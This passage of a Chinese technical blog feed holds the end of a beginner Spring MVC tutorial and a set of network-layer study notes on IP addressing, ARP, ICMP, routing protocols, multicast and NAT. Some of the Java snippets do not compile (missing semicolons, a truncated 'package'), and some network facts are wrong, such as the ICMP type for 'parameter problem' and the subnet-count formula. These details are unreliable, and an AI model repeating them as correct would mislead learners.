<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402161031367.png" class title="image-20220402161031367">

<p>点击运行程序后通过浏览器访问默认页面，运行效果如下：</p>
<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402161439032.png" class title="image-20220402161439032">

<h2 id="SpringMVC应用创建"><a href="#SpringMVC应用创建" class="headerlink" title="SpringMVC应用创建"></a>SpringMVC应用创建</h2><p>首先在src文件夹下新建包org.springmvc.helloworld和类TestController.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.springmvc.helloworld;</span><br><span class="line">import org.springframework.stereotype.Controller</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping</span><br><span class="line"></span><br><span class="line">        @Controller</span><br><span class="line">public class TestController &#123;</span><br><span class="line">        @RequestMapping(&quot;/test&quot;)</span><br><span class="line">            public String helloworld()&#123;</span><br><span class="line">            return &quot;hello&quot;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>该代码通过RequestMapping对访问路径进行定义，这里以test对父目录进行定义，然后以Index对子目录进行定义，helloworld方法通过&#x2F;test&#x2F;index这个URL来访问helloworld.jsp这个文件</p>
<p>接下来在jsp文件夹下创建hello.jsp文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: Administrator</span><br><span class="line">  Date: 2022/4/2</span><br><span class="line">  Time: 16:32</span><br><span class="line">  To change this template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Hello!!!!! Whale-fall</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行tomcat后，通过浏览器访问</p>
<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402200121507.png" class title="image-20220402200121507">

<h2 id="SpringMVC-Model向view传值"><a href="#SpringMVC-Model向view传值" class="headerlink" title="SpringMVC Model向view传值"></a>SpringMVC Model向view传值</h2><p>上图已经成功创建了视图，接下来就是通过Model向view进行传值输出。</p>
<p>这里需要引用org.springframework.ui.Model包对相关变量进行赋值，代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ackage com.springmvc.Controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">@Controller</span><br><span class="line">public class HelloWorldController &#123;</span><br><span class="line">    @RequestMapping(value=&quot;/test&quot;)</span><br><span class="line">    public String hello(Model model)&#123;</span><br><span class="line">        model.addAttribute(“name”,&quot;whale-fall&quot;)</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>hello.jap文件修改如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; isELIgnored=&quot;false&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;hello&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;hello!!!!!$&#123;name&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行tomcat通过浏览器访问</p>
<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402201015681.png" class title="image-20220402201015681">

<p>这里的输出和上面的一样，但不同的是通过变量值来传参输出的</p>
<h2 id="SpringMVC获取URL参数值"><a href="#SpringMVC获取URL参数值" class="headerlink" title="SpringMVC获取URL参数值"></a>SpringMVC获取URL参数值</h2><p>我们知道如何对视图进行传值，那如果我们需要从URL中获取到参数来输出呢？只需要在定义方法时顺便写上需要的参数即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.springmvc.Controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">@Controller</span><br><span class="line">public class HelloWorldController &#123;</span><br><span class="line">    @RequestMapping(value=&quot;/test&quot;)</span><br><span class="line">    public String hello(String name,Model model)&#123;</span><br><span class="line">        model.addAttribute(&quot;name&quot;,&quot;whale-fall&quot;);</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过浏览器 &#x2F;?name&#x3D;whale-fall进行传参</p>
<img src="/2022/04/02/%E7%AC%AC%E4%B8%80%E4%B8%AASpring-MVC%E9%A1%B9%E7%9B%AE/image-20220402203152029.png" class title="image-20220402203152029">

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/qq_36890370/article/details/113815490">(67条消息) IDEA2020 创建一个SpringMVC工程_逮仔的博客-CSDN博客_idea创建springmvc工程</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>java</category>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>-Java -Spring MVC -框架</tag>
      </tags>
  </entry>
  <entry>
    <title>网络层知识要点</title>
    <url>/2022/07/20/%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/</url>
    <content><![CDATA[<h1 id="网络层知识要点"><a href="#网络层知识要点" class="headerlink" title="网络层知识要点"></a>网络层知识要点</h1><h2 id="提供服务-两种"><a href="#提供服务-两种" class="headerlink" title="提供服务(两种)"></a>提供服务(两种)</h2><p>1、虚电路服务</p>
<p>建立虚电路，让网络负责可靠交付面向连接的通信方式，分组沿这条逻辑连接进行存储转发方式传送，使得所发送的分组无差错按序到达终点。</p>
<p>2、数据报服务</p>
<p>网络层向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务(不可靠)。不需要建立连接，每个分组独立发送，尽最大努力进行交付，使得网络路由简单并且价格低廉。提供面向非连接、不可靠和尽最大努力的服务。</p>
<h2 id="网际协议-IP"><a href="#网际协议-IP" class="headerlink" title="网际协议(IP)"></a>网际协议(IP)</h2><p>将互连以后的计算机网络看成是一个逻辑互联网络，使得各种性能各异的网络在网络层上看起来是一个统一的网络。</p>
<p>配套协议：<strong>ARP(地址解析协议)、RARP(逆地址解析协议)、Icmp(网络控制报文协议)、IGMP(网络组管理协议)</strong></p>
<p>IP协议经常使用ARP协议，ICMP和IGMP协议经常使用IP协议。</p>
<p><strong>虚拟互连网络</strong></p>
<p>(1) 网络互相连接的中间设备</p>
<p>物理层中继系统：转发器,放大器，集线器</p>
<p>数据链路中继系统：网桥或桥接器、交换机</p>
<p>网络层中继系统：路由器</p>
<p>网络层以上的中继系统：网关</p>
<p>互联网由多种异构网络互连组成。</p>
<h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a><strong>IP地址</strong></h3><p>全世界唯一的<strong>32位</strong>标识符，由因特网名字与号码指派公司(ICANN)进行分配。标志着一个主机(路由器)和一条链路的接口。</p>
<p>IP地址分类是通过网络号和主机号这两个字段来分类的：</p>
<p><strong>IP地址定义为&#x3D;{&lt;网络号&gt;,&lt;主机号&gt;}</strong></p>
<p>A类地址：网络号8位(0)，主机号24位。范围为0.0.0.0-127.255.255.255。保留给政府机构。</p>
<p>B类地址：网络号16位(10)，主机号16位。范围为128.0.0.0-191.255.255.255。中等规模公司。</p>
<p>C类地址：网络号24位(110)，主机号8位。范围为192.0.0.0-223.255.255.255。个人</p>
<p>D类地址：网络位32位(1110)。组播</p>
<p>E类地址：网络位32位(1111)。实验</p>
<p><strong>点分十进制记法</strong>：将每8位的二进制数转换为十进制数，提高可读性。</p>
<p><strong>常用三种类别的IP地址</strong></p>
<ul>
<li>A类地址可指派网络号为126(128-2)，除去网络号全0和127环回地址。每个A类网络最大主机数是2^24-2(全0网络地址和全1广播地址)。共有2^31个IP地址，占整个IP地址空间的50%。</li>
<li>B类地址可指派网络数为2^14-1，除去128.0.0.0。每个网络最大主机数为2^16-2。共有2^30个地址，占整个IP地址空间的25%.</li>
<li>C类地址可指派网络数为2^21-1，除去192.0.0.0。每个网络最大主机数位2^8-2。共有2^29个IP地址，占整个IP地址空间的12.5%。</li>
</ul>
<p><strong>IP地址分等级地址结构好处</strong>：</p>
<p>1、IP地址管理机构只分配网络号，剩下的主机号由该网络号单位自行分配，方便IP地址的管理。</p>
<p>2、路由器根据主机号对应的网络号来对接收到的分组进行转发，使得路由表中项目数大幅度减少，从而减小了路由表所占的存储空间。</p>
<h3 id="地址解析协议ARP"><a href="#地址解析协议ARP" class="headerlink" title="地址解析协议ARP"></a><strong>地址解析协议ARP</strong></h3><p>将IP地址转换为MAC物理地址，这一过程是自动进行的。</p>
<p>每个主机有ARP高速缓存保存各主机关于IP地址到MAC地址的映射表。在主机通信时，在高速缓存中查找目标IP对应的MAC地址将其添加到数据帧中进行发送，若没有相对应的MAC地址，主机会在局域网中发送ARP广播请求目标IP地址的MAC地址并将自己的映射关系包含在广播报文中，目标主机接收到该广播后通过单播返回映射关系并记录源主机的映射关系到ARP高速缓存中。</p>
<p>高速缓存中每个映射地址项目都设置生存时间。</p>
<p><strong>4种情形</strong></p>
<p>(1)、主机将IP数据包发送到局域网中的另一个主机，使用ARP查找目的主机MAC地址进行发送。</p>
<p>(2)、主机将IP数据包发送到另外一个网络上的主机，使用ARP查找路由器的MAC地址将其发送给路由器，路由器通过对路由表中的目的IP的查找将IP数据包转发到对应网段的端口，在另外一个局域网中即可通过ARP返回目的主机的MAC地址并进行封装将IP数据包发送到该主机。</p>
<p>(3)、当源主机与目标主机之间相隔多个局域网时，主机先将IP数据报发送到路由器网关后，在通过路由器转发到另外一个路由器网关上进行转发，直到目标主机收到该IP数据报。</p>
<p><strong>为什么不直接使用MAC地址进行通信</strong>：由于全世界存在着各式各样的网络，使用不同的硬件地址，要使这些异构网络互相通信就必须进行非常复杂的硬件地址转换工作。使用统一的IP地址简单方便，而且ARP转换是计算机自动进行的。</p>
<h3 id="IP数据报格式"><a href="#IP数据报格式" class="headerlink" title="IP数据报格式"></a><strong>IP数据报格式</strong></h3><p>由首部和数据组成。首部固定部分为20字节，后面有可选字段，首部长度是可变的。</p>
<img src="/2022/07/20/%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220725190114559.png" class title="image-20220725190114559">

<p>报文字段：</p>
<p>1、版本。4位，IP协议的版本，即IPV4。</p>
<p>2、首部长度。4位，可表示的最大数值是15个单位(一个单位)，首部长度最大长度是60字节。</p>
<p>3、区分服务。8位。</p>
<p>4、总长度。16位，首部和数据之和的长度。分片数据报最大长度为65535字节。</p>
<p>5、标识。16位。</p>
<p>6、标志。3位。标志字段最低位MF(MF&#x3D;1表示后面还有分片，MF&#x3D;0表示最后一个分片)，中间一位是DF(DF&#x3D;0允许分片)。</p>
<p>7、片偏移。13位。指分组在分片后中每个分片在原分组中的相对位置。以8个字节位偏移单位。</p>
<p>8、生存时间(TTL)。8位。数据报中可通过的路由器数的最大值，每经过路由器减1。</p>
<p>9、协议。8位。指出使用何种协议使得IP层将数据部分上交给哪个处理过程。</p>
<p>​     <img src="/2022/07/20/%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20221011215540835.png" class title="image-20221011215540835"></p>
<p>10、首部校验和。16位。检验首部是否符合。</p>
<p>11、源地址和目的地址字段。各占4字节。</p>
<h3 id="转发分组的流程"><a href="#转发分组的流程" class="headerlink" title="转发分组的流程"></a><strong>转发分组的流程</strong></h3><p>路由器路由表中记录的是目的网络地址、子网掩码以及对应的下一跳接口地址。</p>
<p><strong>特定主机路由</strong></p>
<p>对特定目的主机指名一个路由。方便网络管理人员控制网络和测试网络。</p>
<p><strong>默认路由</strong></p>
<p>指当在路由器转发表中找不到目的网络时，选择的路由(0.0.0.0)</p>
<p><strong>流程</strong></p>
<p>1、若路由表中有直接到达目标主机对应网段的路由，直接将分组转发到对应的接口交付到目标主机。</p>
<p>2、若路由器有特定主机路由，则将数据报传送给指明的下一跳路由器。</p>
<p>3、若路由器有默认路由，则将数据报传送给路由表指明的下一跳路由器。</p>
<p>2、主机A到主机B中相隔多个网段时，首先将该网段连接的路由器接口Mac地址填入数据帧中发送给路由器，路由器接收到该数据报后，首先通过自身路由表查找IP数据报中目的IP对应网段的下一跳地址，将该数据报转发到对应下一跳接口。此时继续进行数据报转发，将数据链路层的数据帧源帧修改为本路由器MAC地址(需要ARP协议转换)，目的MAC地址填入下一个路由器MAC地址进行转发。当数据报转发到最后一个路由器时，直接通过转发表交付数据报。</p>
<h2 id="划分子网和构造超网"><a href="#划分子网和构造超网" class="headerlink" title="划分子网和构造超网"></a>划分子网和构造超网</h2><h3 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a>划分子网</h3><p><strong>从二级IP地址到三级IP地址：</strong></p>
<p>由于IP地址空间利用率很低，造成IP地址浪费。</p>
<p>每个物理网络分配一个网络号使得路由表变得很大使得网络性能变坏。</p>
<p>两级IP地址使用不灵活。</p>
<p><strong>添加子网号</strong></p>
<p>网络号从主机号中借用若干位来作为子网号进行子网的划分变成三级IP地址。</p>
<p>IP地址：：&#x3D;{&lt;网络号&gt;，&lt;子网号&gt;，&lt;主机号&gt;}</p>
<p>使用<strong>子网掩码</strong>可以判断目标IP是否进行了子网划分。</p>
<p>(IP地址) AND与 (子网掩码) &#x3D; 子网网络地址</p>
<p>子网数&#x3D;2*子网号数-2，除去全0和全1。</p>
<p>划分子网增加了灵活性减少了连接在网络上的主机。</p>
<p><strong>分组转发</strong></p>
<p>路由表增加了子网掩码，路由器将IP报文中的IP地址与子网掩码相与得到网络地址来与路由表中项目相匹配并进行转发。</p>
<h3 id="无分类域间路由选择-CIDR"><a href="#无分类域间路由选择-CIDR" class="headerlink" title="无分类域间路由选择(CIDR)"></a><strong>无分类域间路由选择(CIDR)</strong></h3><p>使用变长子网掩码(VLSM)进一步提高IP地址资源的利用率，更加有效的分配IPV4的地址空间。将网络号和子网号作为网络前缀，变成二级编制。</p>
<p>IP地址：：&#x3D;{&lt;网络前缀&gt;，&lt;主机号&gt;}</p>
<p><strong>主要特点：</strong></p>
<ul>
<li>消除传统分类地址以及划分子网的概念，更有效分配IPv4地址。</li>
<li>网络前缀相同的连续IP地址组成一个CIDR地址块。</li>
</ul>
<p>地址块：n为主机位数，地址块为2的n次方个地址。主机地址为2的n次方-2(除去全0，全1)。网络前缀越少，其地址块所包含地址数越多。</p>
<p>路由聚合：一个CIDR地址块可以表示为很多地址，将这些地址进行聚合称为路由聚合，构成超网。减少路由器之间路由选择信息的交换，提高整个因特网的性能。</p>
<p>最长前缀匹配：在路由器进行路由转发过程中，应从匹配结果中选择具有最长网络前缀的路由。网络前缀越长，路由越具体。</p>
<p><strong>使用二叉线索查找路由表</strong></p>
<p>当路由器项目数很大时，寻找最长前缀匹配这一过程就会变得复杂，使用二叉线索存储路由表中的项目形成层次结构。</p>
<h2 id="网际报文控制协议-ICMP"><a href="#网际报文控制协议-ICMP" class="headerlink" title="网际报文控制协议(ICMP)"></a><strong>网际报文控制协议(ICMP)</strong></h2><p>提高数据报交付成功机会，ICMP允许主机或路由器报告差错情况和提供有异常情况的报告。</p>
<img src="/2022/07/20/%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220726142131495.png" class title="image-20220726142131495">

<p>1、类型：8位，一个字节，表示报文类型。</p>
<p>2、代码：8位，一个字节。</p>
<p>3、校验和：16位。</p>
<img src="/2022/07/20/%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220726143400812.png" class title="image-20220726143400812">

<img src="/2022/07/20/%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220726143425591.png" class title="image-20220726143425591">

<p><strong>ICMP报文分为ICMP差错报告报文和ICMP询问报文</strong>。</p>
<p>差错报告报文有5种：</p>
<p>终点不可达3，源点抑制4，时间超过11，参数问题11和路由重定向12。</p>
<p>ICMP差错报告报文数据字段内容：</p>
<p>将收到的差错报告的IP数据报的首部和数据字段的前8个字节提取出来作为ICMP差错报文的数据字段，再加上相应的ICMP差错报告报文的前8个字节构成了ICMP差错报告报文。</p>
<img src="/2022/07/20/%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20221013205500902.png" class title="image-20221013205500902">

<p>不应当发送差错报告报文情况： </p>
<img src="/2022/07/20/%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220726144230972.png" class title="image-20220726144230972">

<p>ICMP询问报文有两种：</p>
<p>回送请求和回答报文(ping命令)：测试目的站是否可达。</p>
<p>时间戳请求和回答报文：进行时钟同步和测量时间，1900.1.1到现在多少秒。</p>
<p>应用：ping和traceroute&#x2F;tracert</p>
<h2 id="路由选择协议"><a href="#路由选择协议" class="headerlink" title="路由选择协议"></a>路由选择协议</h2><p>采用分层次的路由选择协议:</p>
<ul>
<li>因特网规模非常大，若让所有路由器知道所有网络，使得路由表非常大，处理花大量时间。</li>
<li>许多单位隐藏自己单位网络布局和路由选择协议</li>
</ul>
<p>将整个互联网分为许多较小的自治系统AS。</p>
<h3 id="内部网关协议IGP-interior-Gateway-Protocol"><a href="#内部网关协议IGP-interior-Gateway-Protocol" class="headerlink" title="内部网关协议IGP(interior Gateway Protocol)"></a><strong>内部网关协议IGP</strong>(interior Gateway Protocol)</h3><p>在一个自治系统内部使用的路由选择协议。RIP和OSPF协议。</p>
<h4 id="RIP-Routing-information-Protocol"><a href="#RIP-Routing-information-Protocol" class="headerlink" title="RIP(Routing information Protocol)"></a><strong>RIP(Routing information Protocol)</strong></h4><p>分布式的基于矢量的路由选择协议。</p>
<p>每经过一个路由器，跳数加1.一条路径最多包含15跳。只适用于小型互联网。</p>
<p>(1)仅和相邻路由器交换信息</p>
<p>(2)交换信息即当前自己的路由表</p>
<p>(3)按固定的时间间隔进行交换路由信息(30s)</p>
<p>更新原则是找出每个路由器到每个目的网络的最短路由。</p>
<p><strong>距离矢量算法</strong></p>
<p>(1)收到相邻路由器(地址为X)的RIP报文：</p>
<p>先修改此RIP报文中的所有项目，将“下一条”地址修改为X，并将“距离”的值加1。若报文中项目的目的网络不在路由表中，则将该项目添加到路由表中；否则将收到的项目替换原路由表中的项目，当项目中距离小于路由表中距离则更新。3min还没收到相邻路由器的更新路由表，则将其标记为不可达路由器。</p>
<p>(2)路由器之间交换信息</p>
<p>RIP协议让互联网中所有路由器和自己相邻的路由器不断交换路由信息，使得路由最短</p>
<p>存在问题：当网络出现故障时，经过较长的时间才能将此信息传送到所有的路由器。</p>
<p>优点：实现简单、开销较小。</p>
<p>缺点：限制了网络的规模。随着网络规模的扩大，导致开销增大。当网络出现故障时，要经过较长时间将此信息传送到所有路由器(更新过程收敛时间过长)。</p>
<p><strong>报文格式</strong></p>
<p>RIP2协议标准，由UDP进行传送(端口为520)，RIP报文由首部和路由部分组成。</p>
<img src="/2022/07/20/%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20221013205749385.png" class title="image-20221013205749385">



<h4 id="OSPF-Open-Shortest-Path-First"><a href="#OSPF-Open-Shortest-Path-First" class="headerlink" title="OSPF(Open Shortest Path First)"></a><strong>OSPF(Open Shortest Path First)</strong></h4><p>开放最短路径优先协议，分布式链路状态协议。开放是指公开发表，最短路径优先是指使用最短路径算法SPF。</p>
<p>(1)向本自治系统中所有路由器发送消息，使用洪泛法。</p>
<p>(2)发送的信息就是与路由器相邻的所有路由器的链路状态。如与哪些路由相邻，以及该链路的度量。</p>
<p>(3)当链路状态发生变化后，路由器才用洪泛法向多有路由器发送。</p>
<p>可给每条路指派不同的代价，对于不同类型的业务可计算出不 同的路由，根据链路带宽来计算链路的代价。</p>
<p>当到同一网络由多条相同代价路径，可将通信量分配实现负载平衡。</p>
<p><strong>链路状态数据库</strong></p>
<p>所有的路由器建立一个链路状态数据库，在全网范围内是一致的。路由器根据数据库中的数据来构造自己的路由表，并且能够较快的进行更新使得各个路由器及时更新路由表。更新过程收敛快。</p>
<p><strong>划分区域</strong></p>
<p>将自治系统划分为若干个更小的范围，称为区域，都有一个32位区域标识符，最好不要超过200个。</p>
<p>利用洪泛法交换链路状态的范围局限于每一个区域，减少整个网络上的通信量。为了使每个区域能和其他区域进行通信，进行层次结构的区域划分。在上层的区域叫作主干区域，标识符位0.0.0.0，通过区域边界路由器连通其他下层的区域，在主干区域中的路由器叫作主干路由器，与其他自治系统交换路由信息的自治系统边界路由器。</p>
<p>使得每一个区域内部交换路由信息通信量减少。</p>
<p><strong>分组类型</strong></p>
<p>问候分组:用来发现和维持邻站的可达性(10s)。</p>
<p>数据库描述分组：向邻站发送自己的所有链路状态摘要信息。</p>
<p>链路状态请求分组：向对方请求某些链路项目的详细信息。</p>
<p>链路状态更新分组：使用洪泛发对全网更新链路状态。</p>
<p>链路状态确认分组：对链路更新分组的确认。</p>
<p>OSPF工作过程：</p>
<p>1、每两个相邻路由器隔10s交换问候分组，确保相邻路由器可达。</p>
<p>2、每个路由器使用数据库描述分组和相邻路由器交换本数据库中已有的链路状态摘要</p>
<p>3、每个路由器使用链路状态请求分组向对方请求缺少的某些链路状态项目的详细信息。通过一系列的分组交换，全网同步的链路数据库建立。</p>
<p>4、当某个路由器链路状态变化时，使用洪泛法将链路状态更新分组向全网路由器发送。路由器收到更新分组后会发出确认。30分钟刷新链路状态。</p>
<p><strong>报文</strong></p>
<p>直接用IP数据报传送(协议字段值为89)</p>
<img src="/2022/07/20/%E7%BD%91%E7%BB%9C%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20221013213302403.png" class title="image-20221013213302403">





<h3 id="外部网关协议EGP-external-Gateway-Protocol"><a href="#外部网关协议EGP-external-Gateway-Protocol" class="headerlink" title="外部网关协议EGP(external Gateway Protocol)"></a><strong>外部网关协议EGP</strong>(external Gateway Protocol)</h3><p>源站和目的站处在不同的自治系统中，在自治系统之间的路由选择。如BGP-4.</p>
<p><strong>BGP</strong></p>
<p>不同于自治系统的路由器之间交换路由信息的协议。<strong>力求寻找一条能够到达目的网络且比较好的路由</strong>，并非寻找一条最佳路由。</p>
<p><strong>4种报文</strong></p>
<p>打开报文：用来与相邻的另一个BGP发言人(自治系统边界路由器)建立关系。</p>
<p>更新报文：用来发送某一路由的信息，以及列出要撤销的多条路由。</p>
<p>保活报文：用来确认打开报文和周期性的证实邻站关系。</p>
<p>通知：用来发送监测到的差错</p>
<h3 id="路由器构成"><a href="#路由器构成" class="headerlink" title="路由器构成"></a>路由器构成</h3><p>由多个输入端口和多个输出端口实现转发分组的专用计算机。路由选择+分组转发。</p>
<p>路由选择：通过路由选择处理机根据选择的路由选择协议构造路由表，定期维护和更新路由表。</p>
<p>分组转发：交换组织通过转发表对输入端口的分组从何出的输出端口转发出去。</p>
<p>交换结构+输入端口+输出端口。</p>
<p>转发表由路由表得出。</p>
<p>交换结构常用方法：通过存储器、通过总线、通过互联网络</p>
<h2 id="IP多播"><a href="#IP多播" class="headerlink" title="IP多播"></a>IP多播</h2><p>在一对多的通信中可大大节约网络资源。</p>
<p>多播使用组地址，IP使用D类地址用于目的地址，首部协议字段为2(网际组管理协议IGMP)，不能用于源地址。其中组地址由因特网号码指派管理局IANA负责指派。</p>
<h3 id="在局域网上进行硬件多播"><a href="#在局域网上进行硬件多播" class="headerlink" title="在局域网上进行硬件多播"></a>在局域网上进行硬件多播</h3><p>IANA拥有以太网地址块高24位00-00-5E，范围是从01-00-5E-00-00-00到01-00-5E-7F-FF-FF。D类IP地址前9位不能用来构成以太网硬件地址。 多播IP地址与以太网硬件地址映射关系不是唯一的，要利用IP层软件进行过滤。</p>
<h3 id="网际组管理协议-Internet-Group-Management-Protocol"><a href="#网际组管理协议-Internet-Group-Management-Protocol" class="headerlink" title="网际组管理协议(Internet Group Management Protocol)"></a>网际组管理协议(Internet Group Management Protocol)</h3><p>让连接在本地局域网上的多播路由器知道本局域网中哪些主机进程加入了哪个多播组。</p>
<p>多播路由选择协议：连接在因特网上的多播路由器必须和因特网上的其他多播路由器协同工作，以便把多播数据报最小代价传送所有的组成员。</p>
<p>阶段过程：</p>
<p>第一阶段：当某个主机加入新的多播组后，该主机向多播组的多播地址发送IGMP报文。本地的多播路由器收到IGMP报文后将组成员关系转发到因特网上的其他多播路由器。</p>
<p>第二阶段：本地多播路由器周期性探询本地局域网上主机是否还是多播组成员。</p>
<h2 id="虚拟专用网VPN和网络地址转换NAT"><a href="#虚拟专用网VPN和网络地址转换NAT" class="headerlink" title="虚拟专用网VPN和网络地址转换NAT"></a>虚拟专用网VPN和网络地址转换NAT</h2><p><strong>虚拟专用网VPN</strong></p>
<p>利用公用的因特网作为本机构各专用网络之间的通信载体。</p>
<p>IP隧道技术实现VPN：路由器将内部数据报进行加密重新加上数据报的首部，添加路由器的全球地址进行发送。</p>
<p>内联网、外联网、远程接入VPN</p>
<p><strong>网络地址转换NAT</strong></p>
<p>内部地址：</p>
<p>10.0.0.0 - 10.255.255.255 、172.16.0.0 - 172.31.255.255、192.168.0.0 - 192.168.255.255</p>
<p>本地主机通过NAT路由器将本地地址转换为公有IP地址与因特网连接。</p>
<p>转换过程：</p>
<p>一个局域网中的主机要与互联网中另外一个主机进行通信，通过NAT路由器将数据报中的本机地址转换为公网地址，目的地址不变。在收到目标主机的数据报时，根据路由器中映射将数据报中目的地址转换为本地IP地址，最后转发到本地主机。</p>
<p>专用网内部主机不能充当服务器使用，因为因特网上的用户无法请求专用网络内的服务器提供服务。</p>
<p><strong>网络地址与端口转换NAPT</strong></p>
<p>将专用IP地址和端口转换为全球IP地址和端口，可以共有NAT路由器上一个全球IP地址与因特网上不同主机进行通信。</p>
<h2 id="知识要点"><a href="#知识要点" class="headerlink" title="知识要点"></a>知识要点</h2><p>1、3种静态路由选择策略具体算法：泛射路由选择、固定路由选择、随机路由选择。</p>
<p>2、3种动态路由选择策略具体算法：独立路由选择、集中路由选择、分布路由选择。</p>
<p>3、224.0.0.5代表的是组播地址。</p>
<p>4、MTU：IP层下面数据链路层所限定的帧格式中数据字段的最大长度。它与IP数据报首部中的总长度字段有关。802.3以太网可传送的帧长度为1500个字节。</p>
<p>5、一个计算机网络的三个组成部分：通信子网、通信协议以及若干主机。</p>
<p>6、</p>
<p>数据报服务特征：不需要建立连接；采用全网地址；要求路由选择；数据报不一定按序达到目的节点；易于平衡网络流量</p>
<p>虚电路服务特征：建立连接；路由选择；按顺序传送分组；可靠性较高。</p>
<p>7、路由器采用存储转发技术进行路由转发，在每个节点都要接受、存储、检错、纠错和转发大量的数据信息，并且路由表建表、改表和查表产生节点延迟。</p>
<p>8、网络互联指相互连接的计算机网络组成大型的计算机网络，使得处于不同地理位置的计算机进行通信，促成了当今的信息世界。</p>
<p>存在问题：</p>
<p>不同的寻址方案，不同的最大分组长度；不同的网络介入机制；不同的超时控制；不同的差错控制方法；不同的状态报告方法；不同的路由选择技术；不同的用户接入控制；不同的服务；不同的管理和控制方式。</p>
<p>9、IP地址方案和我国电话号码体制不同点(3点)</p>
<ul>
<li>IP地址是固定长度，我国固定电话号码是不定长度，没有上限。</li>
<li>IP地址与地理位置无关，而电话号码前面区号表示物理位置，后面三位号码表示交换机编号</li>
<li>IP地址是世界上唯一的，而家中可以并联多个电话机使用相同电话号码。</li>
</ul>
<p>10、推荐的子网掩码为连续的1和连续的0.</p>
<p>11、IP数据报首部检验和并不检验数据报中的数据。</p>
<p>优点：不检验数据部分可以加快检验的过程，使转发分组更快。</p>
<p>缺点：数据部分出现差错不能及时发现，当报文到达目的主机时也不检查数据部分，直到IP数据报的数据部分上交给运输层TCP才能检查数据有无差错。</p>
<p>12、当路由器发现一IP数据报的首部校验和有差错时，直接丢弃：是因为IP首部中的源IP地址有可能是错误的，要求错误的源地址重传数据是没有意义的。并且不使用CRC可减少路由器进行检验的时间。</p>
<p>13、将IP数据报在目的站进行组装并不是在中间的路由器进行组装时原因：</p>
<ul>
<li>路由器处理数据报更简单些</li>
<li>并非所有的数据报片都经过同样的路由器，因此在每一个中间的路由器进行组装时可能会缺少数据报片</li>
<li>也许分组在传输过程中还需要对其进行更小的划分，在中间的路由器进行组装就可能会组装多次。</li>
</ul>
